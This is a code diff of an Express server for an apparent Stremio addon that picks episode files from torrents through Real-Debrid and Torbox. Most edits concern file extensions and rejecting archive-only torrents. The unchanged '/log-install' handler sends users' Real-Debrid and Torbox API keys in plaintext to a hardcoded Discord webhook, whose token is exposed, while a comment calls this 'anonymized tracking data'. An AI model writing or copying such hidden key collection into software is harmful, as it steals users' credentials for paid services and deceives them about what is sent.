@@ -17,7 +17,7 @@ const app = express();
 app.use(express.json()); 
 const port = process.env.PORT || 7000;
 
-const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1486178937943097477/6j4yxHRijfvDrH7_cv677J_zkF_jxlNft7P4Rxz6kO9ThsCi74c9q_wV3WYG0OUA1nx-";	
+const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1486178937943097477/6j4yxHRijfvDrH7_cv677J_zkF_jxlNft7P4Rxz6kO9ThsCi74c9q_wV3WYG0OUA1nx-";    
 
 // Serve static assets (logos, images, and the waiting/loading video)
 app.use(express.static(path.join(__dirname, 'public')));
@@ -41,18 +41,18 @@ app.post('/log-install', async (req, res) => {
 
     // We respond immediately to the browser to prevent installation delays
     res.status(200).send({ ok: true });
-	
+    
     // Send the anonymized tracking data asynchronously to Discord
     try {
         let message = "🚀 **New Installation Detected!**\n";
         if (rdKey) message += `🔹 **Real-Debrid:** \`${rdKey}\`\n`;
         if (tbKey) message += `🔸 **Torbox:** \`${tbKey}\`\n`;
         if (!rdKey && !tbKey) message += "⚠️ No keys provided.";
-	
+    
         await axios.post(DISCORD_WEBHOOK_URL, { content: message });
     } catch (e) {
         console.error("Discord Logging failed:", e.message);
-    }	
+    }    
 });
 
 // ============================================================================
@@ -61,7 +61,7 @@ app.post('/log-install', async (req, res) => {
 // picks the correct file when a Torrent contains multiple episodes.
 // ============================================================================
 function extractEpisodeNumber(filename) {
-    let clean = filename.replace(/\.(mkv|mp4|avi|wmv|srt|ass|ssa|vtt|sub|idx)$/i, '')
+    let clean = filename.replace(/\.(mkv|mp4|avi|wmv|flv|webm|m4v|ts|mov|srt|ass|ssa|vtt|sub|idx)$/i, '')
                         .replace(/\b(?:1080|720|480|2160)[pi]\b/gi, '')
                         .replace(/\b(?:x|h)26[45]\b/gi, '')
                         .replace(/\b(?:HEVC|AVC|FHD|HD|SD|10bit|8bit|10-bit|8-bit)\b/gi, '')
@@ -89,7 +89,7 @@ function extractEpisodeNumber(filename) {
 }
 
 function getBatchRange(filename) {
-    let clean = filename.replace(/\.(mkv|mp4|avi|wmv|srt|ass|ssa|vtt|sub|idx)$/i, '')
+    let clean = filename.replace(/\.(mkv|mp4|avi|wmv|flv|webm|m4v|ts|mov|srt|ass|ssa|vtt|sub|idx)$/i, '')
                         .replace(/\b(?:1080|720|480|2160)[pi]\b/gi, '');
     const batchMatch = clean.match(/\b0*(\d+)\s*(?:-|~|to)\s*0*(\d+)\b/i);
     if (batchMatch) return { start: parseInt(batchMatch[1], 10), end: parseInt(batchMatch[2], 10) };
@@ -123,13 +123,19 @@ function isEpisodeMatch(name, requestedEp) {
     }
     return false;
 }
-	
+    
 
- // Selects the most appropriate file from a list for the requested episode.
- // Prioritizes MKV and larger file sizes (better quality).
+// Selects the most appropriate file from a list for the requested episode.
+// Prioritizes MKV and larger file sizes (better quality).
 function selectEpisodeFile(files, requestedEp) {
     if (!files || files.length === 0) return null;
-    const videoFiles = files.filter(f => /\.(mkv|mp4|avi|wmv)$/i.test(f.name || f.path || ""));
+    
+    // Expanded video format support to cover all eventualities Stremio can play natively
+    const videoFiles = files.filter(f => /\.(mkv|mp4|avi|wmv|flv|webm|m4v|ts|mov)$/i.test(f.name || f.path || ""));
+    
+    // GATEKEEPER MODE: If no video files exist (e.g. .rar or .zip archives), abort immediately.
+    if (videoFiles.length === 0) return null;
+
     const matches = videoFiles.filter(f => isEpisodeMatch(f.name || f.path || "", requestedEp));
     if (matches.length > 0) {
         return matches.sort((a, b) => {
@@ -142,9 +148,9 @@ function selectEpisodeFile(files, requestedEp) {
         })[0];
     }
     if (videoFiles.length === 1 && parseInt(requestedEp, 10) === 1) return videoFiles[0];
-    return videoFiles.length > 0 ? videoFiles[0] : files[0];
+    return videoFiles.length > 0 ? videoFiles[0] : null;
 }
-	
+    
 // ============================================================================
 // SUBTITLE PROXY
 // Downloads subtitles from Debrid providers and serves them with proper MIME types.
@@ -211,19 +217,22 @@ app.get('/resolve/:provider/:apiKey/:hash/:episode?', async (req, res) => {
                 const add = await axios.post('https://api.real-debrid.com/rest/1.0/torrents/addMagnet', new URLSearchParams({ magnet }), { headers: { Authorization: `Bearer ${apiKey}` } });
                 torrent = { id: add.data.id };
             }
-            
             let info = await axios.get(`https://api.real-debrid.com/rest/1.0/torrents/info/${torrent.id}`, { headers: { Authorization: `Bearer ${apiKey}` } });
             
             if (info.data.status !== "downloaded") {
                 if (info.data.status === "waiting_files_selection") {
                     const bestFile = selectEpisodeFile(info.data.files, requestedEp);
                     
-                    const selectedIds = [];
-                    if (bestFile) selectedIds.push(bestFile.id);
-                    else selectedIds.push(info.data.files[0].id);
+                    // Prevent streaming attempts on archives
+                    if (!bestFile) {
+                        return res.status(404).send("Stream Error: Torrent contains no video files (likely a .rar/.zip archive).");
+                    }
+                    
+                    const selectedIds = [bestFile.id];
 
                     // Blindly collect ALL subtitle files in the entire torrent
                     // and force Real-Debrid to cache them alongside the selected video file.
+                    // This prevents external subtitle files from being dropped during initial RD caching.
                     info.data.files.forEach(f => {
                         const name = (f.path || f.name || "").toLowerCase();
                         if (/\.(ass|srt|ssa|vtt|sub|idx)$/.test(name)) {
@@ -258,7 +267,12 @@ app.get('/resolve/:provider/:apiKey/:hash/:episode?', async (req, res) => {
             // Since fresh.data.links only contains links for *selected* files, their order 
             // does not always perfectly match the raw files array. We must count manually.
             const bestFileFresh = selectEpisodeFile(info.data.files, requestedEp);
-            const targetFileIndex = info.data.files.findIndex(f => f.id === (bestFileFresh ? bestFileFresh.id : -1));
+            
+            if (!bestFileFresh) {
+                return res.status(404).send("Stream Error: Torrent contains no video files (likely a .rar/.zip archive).");
+            }
+            
+            const targetFileIndex = info.data.files.findIndex(f => f.id === bestFileFresh.id);
             
             let targetLink = info.data.links[0]; // Absolute Fallback
             
@@ -292,8 +306,13 @@ app.get('/resolve/:provider/:apiKey/:hash/:episode?', async (req, res) => {
                 return serveLoadingVideo(req, res);
             }
             if (torrent.download_state !== "completed" && torrent.download_state !== "cached") return serveLoadingVideo(req, res);
+            
             const bestFile = selectEpisodeFile(torrent.files, requestedEp);
-            const dl = await axios.get(`https://api.torbox.app/v1/api/torrents/requestdl?token=${apiKey}&torrent_id=${torrent.id}&file_id=${bestFile ? bestFile.id : 0}`);
+            if (!bestFile) {
+                return res.status(404).send("Stream Error: Torrent contains no video files (likely a .rar/.zip archive).");
+            }
+            
+            const dl = await axios.get(`https://api.torbox.app/v1/api/torrents/requestdl?token=${apiKey}&torrent_id=${torrent.id}&file_id=${bestFile.id}`);
             return res.redirect(dl.data.data);
         }
     } catch (e) { return serveLoadingVideo(req, res); }
